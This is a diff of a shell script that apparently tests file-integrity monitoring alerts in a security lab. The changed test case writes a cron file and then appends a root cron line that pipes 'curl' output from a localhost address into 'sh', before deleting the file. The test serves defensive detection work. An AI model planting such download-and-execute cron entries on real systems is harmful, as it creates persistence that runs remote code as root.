@@ -254,8 +254,10 @@ c_10_8(){ mark 10.8 100457 "them file cron va unit systemd (FIM)"
   sleep 5
   rm -f /etc/cron.d/lab_test_job /etc/systemd/system/lab-test.service; }
 
-c_10_9(){ mark 10.9 100458 "them cron co lenh tai curl|sh (FIM report_changes)"
-  printf '# lab test\n0 0 1 1 * root curl -s http://127.0.0.1:9/x | sh\n' > /etc/cron.d/lab_dl_job
+c_10_9(){ mark 10.9 100458 "sua file cron da ton tai them lenh tai curl|sh (FIM report_changes)"
+  printf '# lab test\n' > /etc/cron.d/lab_dl_job
+  sleep 5
+  printf '0 0 1 1 * root curl -s http://127.0.0.1:9/x | sh\n' >> /etc/cron.d/lab_dl_job
   sleep 5
   rm -f /etc/cron.d/lab_dl_job; }
 
